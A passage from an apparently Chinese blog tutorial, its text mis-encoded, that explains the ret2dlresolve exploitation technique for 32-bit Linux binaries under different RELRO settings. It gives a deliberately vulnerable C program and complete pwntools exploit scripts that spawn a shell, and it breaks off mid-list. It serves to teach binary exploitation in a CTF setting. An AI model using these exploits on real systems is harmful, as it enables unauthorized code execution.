Ret2dlresolve</h2><h3 id="NO-RELRO"><a href="#NO-RELRO" class="headerlink" title="NO RELRO"></a>NO RELRO</h3><p>NO RELROï¼Œé¡¾åæ€ä¹‰ï¼Œä¸å¼€å¯é‡å®šå‘åªè¯»ä¿æŠ¤ï¼ˆ<code>.dynamic</code>å¯è¯»å¯å†™ï¼‰ï¼Œå³<code>.dynamic</code>å¯ä»¥è¢«ä¿®æ”¹ã€‚</p><p>å¯¹äºå…³é—­RELROçš„ç¨‹åºæ¥è¯´ï¼Œæœ€ç®€å•çš„åˆ©ç”¨æ–¹æ³•æ˜¯ä¿®æ”¹<code>link_map</code>ä¸­çš„<code>.dynstr</code>çš„åœ°å€ã€‚<span class="github-emoji"><span>â­</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/2b50.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä¿®æ”¹<code>.dynstr</code>èƒ½å¤ŸæˆåŠŸè¿›è¡Œæ”»å‡»çš„æœ€æ ¹æœ¬åŸå› æ˜¯ï¼š<strong>åŠ¨æ€é“¾æ¥å™¨æ ¹æ®åç§»è¿›è¡Œå¯»å€</strong>ï¼ˆå¾ˆæ˜¾ç„¶ä¸èƒ½ä½¿ç”¨å›ºå®šçš„åœ°å€å¯»å€ï¼ŒåŸå› æ˜¯PIEæœºåˆ¶ä¼šä¿®æ”¹ç¨‹åºè½½å…¥çš„åŸºå€ï¼‰ã€‚</p><p><span class="github-emoji"><span>â­</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/2b50.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> NO RELROæ”»å‡»çš„å…·ä½“æµç¨‹å¦‚ä¸‹ï¼š</p><ol><li>åœ¨å¯å†™å†…å­˜ä¸­æ„é€ ä¸€ä¸ªè™šå‡çš„<code>.dynstr</code>åŒºï¼ˆå°†æŸä¸€å‡½æ•°çš„å­—ç¬¦ä¸²æ›¿æ¢ä¸ºå¦å¤–ä¸€ä¸ªå‡½æ•°ï¼Œå¦‚systemã€execveç­‰ï¼‰ï¼›</li><li>ç„¶åè°ƒç”¨å†™å‡½æ•°å°†<code>link_map</code>ä¸­çš„å­˜æ”¾<code>.dynstr</code>çš„æˆå‘˜å˜é‡æ›¿æ¢ä¸ºä¸Šè¿°æ„é€ çš„è™šå‡<code>.dynstr</code>åŒºåœ°å€ï¼›</li><li><strong>å°†åŸå‡½æ•°çš„GOTçš„è·³è½¬åœ°å€ä¿®æ”¹ä¸ºPLTçš„ä¸‹ä¸€æ¡æŒ‡ä»¤åœ°å€</strong>ï¼ˆ<strong>è¿™é‡Œä¹Ÿå¯ä»¥ç›´æ¥RETåˆ°PLTçš„ä¸‹ä¸€æ¡æŒ‡ä»¤</strong>ï¼‰</li><li>ç”±äºæ­¥éª¤3æ¸…ç©ºçš„åŠ¨æ€é“¾æ¥å™¨ä¹‹å‰æŸ¥æ‰¾åˆ°çš„åœ°å€ï¼Œå› æ­¤å†è°ƒç”¨è¯¥å‡½æ•°æ—¶ï¼ŒåŠ¨æ€é“¾æ¥å™¨ä¼šé‡æ–°è°ƒç”¨<code>_dl_runtime_resolve()</code>æ¥æŸ¥æ‰¾è¯¥å‡½æ•°è½½å…¥çš„åœ°å€ï¼Œè€Œæ­¤æ—¶è¯¥å‡½æ•°çš„å­—ç¬¦ä¸²å·²ç»ä¿®æ”¹ä¸ºæ¶æ„çš„å‡½æ•°ï¼ˆå¦‚systemã€execveç­‰ï¼‰ï¼Œé‚£ä¹ˆæœ€ç»ˆæŸ¥æ‰¾åˆ°çš„åœ°å€ä¸ºæ¶æ„å‡½æ•°çš„åœ°å€ï¼Œç”±æ­¤æ”»å‡»æˆåŠŸ</li></ol><p><strong>Q</strong>ï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">vuln</span><span class="hljs-params">()</span> {<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">100</span>];<br>    setbuf(<span class="hljs-built_in">stdin</span>, buf);<br>    read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">256</span>);<br>}<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> {<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">100</span>] = <span class="hljs-string">"Welcome to XDCTF2015~!\n"</span>;<br>    setbuf(<span class="hljs-built_in">stdout</span>, buf);<br>    write(<span class="hljs-number">1</span>, buf, <span class="hljs-built_in">strlen</span>(buf));<br>    vuln();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>}<br></code></pre></td></tr></tbody></table></figure><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">gcc -fno-stack-protector -m32 -z norelro -no-pie main.c -o main_norelro_32<br></code></pre></td></tr></tbody></table></figure><p><strong>EXP</strong>ï¼š</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># encoding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># context.log_level="debug"</span><br>context.terminal = [<span class="hljs-string">"tmux"</span>,<span class="hljs-string">"splitw"</span>,<span class="hljs-string">"-h"</span>]<br>context.arch=<span class="hljs-string">"i386"</span><br><br>sh = process(<span class="hljs-string">"./main_no_relro_32"</span>)<br>rop = ROP(<span class="hljs-string">"./main_no_relro_32"</span>)<br>elf = ELF(<span class="hljs-string">"./main_no_relro_32"</span>)<br><br>sh.recvuntil(<span class="hljs-string">b'Welcome to XDCTF2015~!\n'</span>)<br><br>offset = <span class="hljs-number">0x70</span><br>dynstr_addr = <span class="hljs-number">0x08049804</span> + <span class="hljs-number">4</span><br>dynstr = elf.get_section_by_name(<span class="hljs-string">'.dynstr'</span>).data()<br>dynstr = dynstr.replace(<span class="hljs-string">b"read"</span>,<span class="hljs-string">b"system"</span>)<br><br>bss_end_addr = <span class="hljs-number">0x80498e0</span><br><br>read_got_addr = <span class="hljs-number">0x80498c8</span><br>read_plt_addr = <span class="hljs-number">0x8048370</span><br>read_plt_next_addr = <span class="hljs-number">0x08048376</span><br><br>pop_12 = <span class="hljs-number">0x0804834a</span><br><br>rop.raw(<span class="hljs-string">b'a'</span> * offset)<br><span class="hljs-comment"># modify .dynstr pointer</span><br>rop.read(<span class="hljs-number">0</span>, dynstr_addr, <span class="hljs-number">4</span>)<br><span class="hljs-comment"># construct fake .dynstr</span><br>rop.read(<span class="hljs-number">0</span>, bss_end_addr, <span class="hljs-built_in">len</span>(dynstr))<br><span class="hljs-comment"># construct string "/bin/sh"</span><br>rop.read(<span class="hljs-number">0</span>, bss_end_addr + <span class="hljs-built_in">len</span>(dynstr) + <span class="hljs-number">1</span>, <span class="hljs-built_in">len</span>(<span class="hljs-string">b"/bin/sh\x00"</span>))<br><span class="hljs-comment"># change got of read to next addr of read's plt</span><br>rop.read(<span class="hljs-number">0</span>, read_got_addr, <span class="hljs-number">4</span>)<br>rop.raw(read_plt_addr)<br>rop.raw(<span class="hljs-number">0xdeadbeef</span>)  <span class="hljs-comment"># fake ret</span><br>rop.raw(bss_end_addr + <span class="hljs-built_in">len</span>(dynstr) + <span class="hljs-number">1</span>)  <span class="hljs-comment"># arg1</span><br><br><span class="hljs-keyword">assert</span>(<span class="hljs-built_in">len</span>(rop.chain()) &lt;= <span class="hljs-number">256</span>)<br>rop.raw(<span class="hljs-string">b"a"</span> * (<span class="hljs-number">256</span> - <span class="hljs-built_in">len</span>(rop.chain())))<br><br>sh.send(rop.chain())<br>sh.send(p32(bss_end_addr))<br>sh.send(dynstr)<br>sh.send(<span class="hljs-string">b"/bin/sh\x00"</span>)<br>sh.send(p32(read_plt_next_addr))<br><br>sh.interactive()<br></code></pre></td></tr></tbody></table></figure><blockquote><p>è¯·æ³¨æ„ä½¿ç”¨python3.7ï¼Œå¦åˆ™ROPé“¾ä¼šå­˜åœ¨é—®é¢˜ï¼ˆRELè§£æå‡ºé”™ï¼‰</p></blockquote><p><img src="/2023/10/13/Ret2dlresolve%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90/12.png"></p><h3 id="Partial-RELRO"><a href="#Partial-RELRO" class="headerlink" title="Partial RELRO"></a>Partial RELRO</h3><p>å¦‚ä¸‹ç¼–è¯‘æºæ–‡ä»¶ï¼š</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">gcc -fno-stack-protector -m32 -z relro -z lazy -no-pie ../../main.c -o main_partial_relro_32<br></code></pre></td></tr></tbody></table></figure><p>åœ¨Partial RELROçš„æ¡ä»¶ä¸‹ï¼Œ<code>.dynamic</code>å…¨éƒ¨åªè¯»ï¼Œå› æ­¤ä¸èƒ½åƒä¸Šè¿°é€šè¿‡ä¿®æ”¹æŒ‡é’ˆè¿›è¡Œåˆ©ç”¨ã€‚é‚£æˆ‘ä»¬è¯¥å¦‚ä½•åˆ©ç”¨äº†ï¼Ÿ</p><p>åœ¨Q7ä¸­ï¼Œæˆ‘ä»¬çŸ¥é“<code>_dl_runtime_resolve(link_map, reloc_index)</code>çš„ä¸¤ä¸ªå‚æ•°éƒ½æ˜¯é€šè¿‡PLTä¼ å…¥å †æ ˆçš„ï¼Œç¬¬2ä¸ªå‚æ•°åœ¨<code>func@plt</code>ä¸­è¢«å‹å…¥å †æ ˆï¼Œç¬¬1ä¸ªå‚æ•°åœ¨<code>PLT[0]</code>ä¸­è¢«å‹å…¥å †æ ˆï¼›<strong>å¦‚æœæˆ‘ä»¬æå‰åœ¨å †æ ˆä¸­æ„é€ <code>reloc_index</code>ï¼Œå¹¶å°†å…¶æŒ‡å‘ç²¾å¿ƒä¼ªé€ çš„ç©ºé—´ï¼ˆé‡å®šä½è¡¨é¡¹<code>.rel.plt</code>ã€åŠ¨æ€ç¬¦å·è¡¨<code>.dynsym</code>å’ŒåŠ¨æ€å­—ç¬¦ä¸²<code>.dyn_str</code>ï¼‰ï¼Œé‚£ä¹ˆå°±å¯ä»¥æ··æ·†åŠ¨æ€è½½å…¥çš„å‡½æ•°äº†</strong>ã€‚</p><p><span class="github-emoji"><span>â­</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/2b50.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> æ­¤æ”»å‡»èƒ½å¤ŸæˆåŠŸçš„åŸå› åœ¨äºâ€”â€”<strong>åŠ¨æ€é“¾æ¥å™¨å¯»å€ä½¿ç”¨ç›¸å¯¹åç§»é‡</strong>ï¼š</p><ul><li>reloc_index: index of .rel.plt item</li><li>r_info: index of .dynsym item</li><li>st_name: index of string of .dynstr</li></ul><p>Partial RELROå…·ä½“æ”»å‡»æ­¥éª¤ï¼š</p><ol><li>è·³è½¬åˆ°<code>PLT[0]</code>ï¼š<code>PLT[X]ï¼ˆX&gt;0ï¼‰</code>ä¸­è¿›è¡Œçš„æ“ä½œæ˜¯å°†<code>reloc_index</code>å‹å…¥æ ˆï¼ˆç›¸åº”çš„ï¼Œä¹Ÿè¦æå‰æŠŠå‡½æ•°å‚æ•°é€å…¥æ ˆä¸­ï¼‰ï¼Œè¿™é‡Œæå‰æ„é€ è™šå‡çš„<code>reloc_index</code>æŒ‡å‘æˆ‘ä»¬è‡ªå·±æ„é€ çš„<code>Elf_Rel</code>é¡¹ï¼Œç„¶åè·³è½¬åˆ°<code>PLT[0]</code>ï¼Œæ¥ç€å¾€å †æ ˆä¸­å‹å…¥<code>link_map</code>ï¼Œç´§æ¥ç€å°±æ˜¯è°ƒç”¨<code>_dl_runtime_resolve</code>ï¼›</li><li>åœ¨è™šå‡çš„<code>Elf_Rel</code>é¡¹ä¸­ï¼Œæ„é€ è™šå‡çš„<code>r_info</code>æŒ‡å‘è™šå‡çš„<code>.dynsym</code>çš„<code>Elf_Sym</code>é¡¹ï¼ˆè¿™é‡Œç”±äº<code>r_info</code>è¿‡å¤§å¯èƒ½ä¼šå¯¼è‡´æ£€æŸ¥version hashæ—¶å‡ºé”™ï¼Œè¿™é‡Œéœ€è¦è°ƒæ•´<code>.dynsym</code>çš„åœ°å€ï¼‰</li><li>åœ¨è™šå‡çš„<code>Elf_Sym</code>é¡¹ä¸­ï¼Œ<code>st_name</code>æŒ‡å‘è™šå‡çš„å­—ç¬¦ä¸²ï¼Œå¦‚<code>system</code>ï¼›</li></ol><p>å°è¯•ä¸€ä¸‹ï¼š</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#encoding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># context.log_level="debug"</span><br><br>elf = ELF(<span class="hljs-string">'./main_partial_relro_32'</span>)<br>sh = process(<span class="hljs-string">'./main_partial_relro_32'</span>)<br>rop = ROP(<span class="hljs-string">'./main_partial_relro_32'</span>)<br><br>sh.recvuntil(<span class="hljs-string">b'Welcome to XDCTF2015~!\n'</span>)<br><br>offset = <span class="hljs-number">0x70</span><br>bss_addr = elf.bss()<br>stack_size = <span class="hljs-number">0x800</span><br><br>stack_base = bss_addr + stack_size + <span class="hljs-number">0x10</span> * <span class="hljs-number">40</span>  <span class="hljs-comment"># stack grows from high address to low address!</span><br><br>rop.raw(<span class="hljs-string">b'a'</span> * offset)<br>rop.read(<span class="hljs-number">0</span>, stack_base, <span class="hljs-number">100</span>)<br>rop.migrate(stack_base)  <span class="hljs-comment"># &lt;-- ebp to bss_addr (pop ebp; ret) and leave to ebp (leave[esp = ebp; pop ebp;]; ret)</span><br><span class="hljs-comment"># notice that the addr stored in stack is stack_base - 4</span><br><br>sh.sendline(rop.chain())<br><br>rop = ROP(<span class="hljs-string">'./main_partial_relro_32'</span>)<br>sh_str = <span class="hljs-string">b"/bin/sh\x00"</span><br><br>plt0 = elf.get_section_by_name(<span class="hljs-string">'.plt'</span>).header.sh_addr<br>got0 = elf.get_section_by_name(<span class="hljs-string">'.got'</span>).header.sh_addr<br><br>rel_plt = elf.get_section_by_name(<span class="hljs-string">'.rel.plt'</span>).header.sh_addr<br>dynsym_addr = elf.get_section_by_name(<span class="hljs-string">'.dynsym'</span>).header.sh_addr<br>dynstr_addr = elf.get_section_by_name(<span class="hljs-string">'.dynstr'</span>).header.sh_addr<br><br>write_reloc_offset = stack_base + <span class="hljs-number">24</span> - rel_plt<br>r_offset = write_got = elf.got[<span class="hljs-string">"write"</span>]<br><br>fake_sym_addr = stack_base + <span class="hljs-number">32</span><br>align = <span class="hljs-number">0x10</span> - ((fake_sym_addr - dynsym_addr) &amp; <span class="hljs-number">0xf</span>) <span class="hljs-comment"># align to 0x10</span><br>fake_sym_addr += align<br>index_dynsym = (fake_sym_addr - dynsym_addr) // <span class="hljs-number">0x10</span><br>fake_str_addr = fake_sym_addr + <span class="hljs-number">16</span><br>st_name = (fake_str_addr - dynstr_addr)<br>fake_write_sym = flat([st_name, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0x12</span>])<br><br>r_info = (index_dynsym &lt;&lt; <span class="hljs-number">8</span>) + <span class="hljs-number">0x7</span><br><br>rop.raw(plt0)  <span class="hljs-comment"># jmp plt[0]</span><br>rop.raw(write_reloc_offset)  <span class="hljs-comment"># push offset</span><br>rop.raw(<span class="hljs-string">'fake'</span>)  <span class="hljs-comment"># fake ret</span><br>rop.raw(stack_base + <span class="hljs-number">80</span>)<br>rop.raw(<span class="hljs-number">0</span>)<br>rop.raw(<span class="hljs-number">0</span>)<br><br><span class="hljs-string">'''</span><br><span class="hljs-string">rop.write(1, stack_base + 80, len(sh_str))</span><br><span class="hljs-string">execve("/bin/sh", 0, 0)</span><br><span class="hljs-string">'''</span><br><br><span class="hljs-comment"># fake .rel.plt entry [r_offset, r_info]</span><br>rop.raw(r_offset)<br>rop.raw(r_info)<br><br><span class="hljs-comment"># fake .dynsym entry</span><br>rop.raw(<span class="hljs-string">b'a'</span> * align)<br>rop.raw(fake_write_sym)<br><br><span class="hljs-comment"># fake .dynstr</span><br>rop.raw(<span class="hljs-string">b'execve\x00'</span>)<br><br>rop.raw(<span class="hljs-string">b'a'</span> * (<span class="hljs-number">80</span> - <span class="hljs-built_in">len</span>(rop.chain())))<br>rop.raw(sh_str)<br>rop.raw(<span class="hljs-string">b'a'</span> * (<span class="hljs-number">100</span> - <span class="hljs-built_in">len</span>(rop.chain())))<br><br>sh.sendline(rop.chain())<br><br>sh.interactive()<br></code></pre></td></tr></tbody></table></figure><p>ç»“æœæˆäº†ï¼š</p><p><img src="/2023/10/13/Ret2dlresolve%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90/13.png"></p><blockquote><p>å¯èƒ½ä¼šå­˜åœ¨çš„é—®é¢˜ï¼š</p><ul><li>Glibcè§£æåŠ¨æ€é“¾æ¥æ—¶å¯èƒ½å­˜åœ¨version-hashæ··æ·†é—®é¢˜ï¼Œå…·ä½“è¯¦è§<a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/ret2dlresolve/#stage-4">ret2dlresolve - CTF Wiki (ctf-wiki.org)</a></li></ul></blockquote><p>é™¤æ­¤ä¹‹å¤–ï¼Œä½ ä¹Ÿå¯ä»¥ä½¿ç”¨åŸºäºå·¥å…·çš„ä¼ªé€ ï¼Œå¦‚Roputilæˆ–pwntoolsï¼š</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.binary = elf = ELF(<span class="hljs-string">"./main_partial_relro_32"</span>)<br>rop = ROP(context.binary)<br>dlresolve = Ret2dlresolvePayload(elf,symbol=<span class="hljs-string">"system"</span>,args=[<span class="hljs-string">"/bin/sh"</span>])<br><span class="hljs-comment"># pwntools will help us choose a proper addr</span><br><span class="hljs-comment"># https://github.com/Gallopsled/pwntools/blob/5db149adc2/pwnlib/rop/ret2dlresolve.py#L237</span><br>rop.read(<span class="hljs-number">0</span>,dlresolve.data_addr)<br>rop.ret2dlresolve(dlresolve)<br>raw_rop = rop.chain()<br>io = process(<span class="hljs-string">"./main_partial_relro_32"</span>)<br>io.recvuntil(<span class="hljs-string">"Welcome to XDCTF2015~!\n"</span>)<br>payload = flat({<span class="hljs-number">112</span>:raw_rop,<span class="hljs-number">256</span>:dlresolve.payload})<br>io.sendline(payload)<br>io.interactive()<br></code></pre></td></tr></tbody></table></figure><h3 id="Full-RELRO"><a href="#Full-RELRO" class="headerlink" title="Full RELRO"></a>Full RELRO</h3><p>å¦‚ä¸‹ç¼–è¯‘æºæ–‡ä»¶ï¼š</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">gcc -fno-stack-protector -m32 -z relro -z now -no-pie ../../main.c -o main_partial_relro_32<br></code></pre></td></tr></tbody></table></figure><p><img src="/2023/10/13/Ret2dlresolve%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90/14.png"></p><p>å¼€å¯äº†<code>Full RELRO</code>ä¹‹åï¼Œæ‰€æœ‰GOTè¡¨ä¸­çš„å‡½æ•°éƒ½ä¼šåœ¨ç¨‹åºæ‰§è¡Œå‰è¢«åŠ¨æ€è½½å…¥ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p><p><img src="/2023/10/13/Ret2dlresolve%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90/15.png"></p><p>é™¤æ­¤ä¹‹å¤–ï¼Œæˆ‘ä»¬å†æ¥çœ‹ä¸€ä¸‹GOTè¡¨çš„æƒ…å†µï¼š</p><p><img src="/2023/10/13/Ret2dlresolve%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90/17.png"></p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°<code>link_map</code>åœ°å€å’Œ<code>_dl_runtime_resolve()</code>çš„åœ°å€éƒ½å·²è¢«è®¾ç½®ä¸º0äº†ã€‚è¿™æ ·ä¸€æ¥ï¼Œåœ¨ä¸çŸ¥é“<code>_dl_runtime_resolve()</code>åœ°å€å’Œ<code>link_map</code>ä¿¡æ¯çš„å‰æä¸‹ï¼Œæˆ‘ä»¬æ˜¯æ²¡æœ‰åŠæ³•è¿›è¡Œæ”»å‡»çš„ã€‚å‚è€ƒèµ„æ–™[3]çš„è®ºæ–‡ç»™å‡ºäº†ä¸€ç§æ”»å‡»æ‰‹æ®µï¼Œä¸»è¦é€šè¿‡<strong>ä¿¡æ¯æ³„éœ²</strong>æ¥è·å¾—ç›¸å…³ä¿¡æ¯ï¼š</p><p><span class="github-emoji"><span>1âƒ£</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0031-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> <code>link_map</code>åœ°å€ï¼šä»<code>DT_DEBUG</code>ä¸­è¿›è¡Œæ¢å¤</p><p>è¿™é‡Œéœ€è¦ä»‹ç»ä¸€ä¸‹<code>DT_DEBUG</code>å­˜æ”¾çš„<code>r_debug</code>ç»“æ„ä½“ï¼š</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">r_debug</span><br>  {<br>    <span class="hljs-comment">/* Version number for this protocol.  It should be greater than 0.  */</span><br>    <span class="hljs-type">int</span> r_version;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">link_map</span> *r_map;<span class="hljs-comment">/* Head of the chain of loaded objects.  */</span><br>    <span class="hljs-comment">/* This is the address of a function internal to the run-time linker,</span><br><span class="hljs-comment">       that will always be called when the linker begins to map in a</span><br><span class="hljs-comment">       library or unmap it, and again when the mapping change is complete.</span><br><span class="hljs-comment">       The debugger can set a breakpoint at this address if it wants to</span><br><span class="hljs-comment">       notice shared object mapping changes.  */</span><br>    <span class="hljs-built_in">ElfW</span>(Addr) r_brk;<br>    <span class="hljs-keyword">enum</span><br>      {<br><span class="hljs-comment">/* This state value describes the mapping change taking place when</span><br><span class="hljs-comment">   the `r_brk' address is called.  */</span><br>RT_CONSISTENT,<span class="hljs-comment">/* Mapping change is complete.  */</span><br>RT_ADD,<span class="hljs-comment">/* Beginning to add a new object.  */</span><br>RT_DELETE<span class="hljs-comment">/* Beginning to remove an object mapping.  */</span><br>      } r_state;<br>    <span class="hljs-built_in">ElfW</span>(Addr) r_ldbase;<span class="hljs-comment">/* Base address the linker is loaded at.  */</span><br>  };<br></code></pre></td></tr></tbody></table></figure><p>å…¶ä¸­<code>r_map</code>æŒ‡é’ˆå°±æ˜¯<code>link_map</code>çš„åœ°å€ï¼Œè¿™æ ·ä¸€æ¥æˆ‘ä»¬å°±é€šè¿‡<code>r_debug</code>ç»“æ„ä½“çš„ä¿¡æ¯æ³„éœ²å¾—åˆ°äº†<code>link_map</code>çš„åœ°å€ï¼›</p><p><span class="github-emoji"><span>2âƒ£</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0032-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> <code>_dl_runtime_resolve()</code>çš„åœ°å€</p><p><code>_dl_runtime_resolve()</code>åœ°å€çš„æ¢å¤æ˜¯å¾ˆå·§å¦™çš„ï¼Œå…¶ä¸»è¦çš„æ€æƒ³æ˜¯é€šè¿‡è®¿é—®åº”ç”¨è½½å…¥åº“ä¸­æ²¡æœ‰è¢«Full RELROä¿æŠ¤çš„ELFç›®æ ‡ï¼Œç„¶åè·å¾—è¯¥ç›®æ ‡ä¸­çš„<code>_dl_runtime_resolve()</code>çš„åœ°å€ã€‚è¿™é‡Œé€šè¿‡è®¿é—®ä¸Šè¿°<code>link_map</code>çš„<code>l_next</code>å¯¹è±¡æ¥éå†æ‰€æœ‰è½½å…¥çš„ELFç›®æ ‡çš„<code>link_map</code>ä¿¡æ¯ï¼Œç„¶åæ ¹æ®<code>DT_PLTGOT</code>æ˜¯å¦ä¸º0æ¥åˆ¤æ–­è¯¥ç›®æ ‡æ˜¯å¦å¯åˆ©ç”¨ï¼ˆå¦‚æœä¸º0ï¼Œå¯èƒ½æ˜¯Full RELROä¿æŠ¤çš„ç›®æ ‡æˆ–è€…é™æ€åº“ï¼‰ã€‚å¦‚æœç›®æ ‡å¯åˆ©ç”¨ï¼Œé‚£ä¹ˆæ ¹æ®GOTè¡¨çš„ä¿¡æ¯å³å¯å¾—åˆ°<code>_dl_runtime_resolve()</code>çš„åœ°å€ã€‚</p><p>åœ¨è·å–ä¸Šè¿°ä¸¤ä¸ªåœ°å€ä¹‹åï¼Œæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨Partial RELROä¸­çš„æ”»å‡»æ‰‹æ®µè¿›è¡Œæ”»å‡»ã€‚</p><p>æˆ‘ä»¬ç¨å¾®ç®€å•çš„æ€»ç»“ä¸€ä¸‹Full RELROçš„æ”»å‡»æ‰‹æ®µï¼š</p><ol><li><p>æ 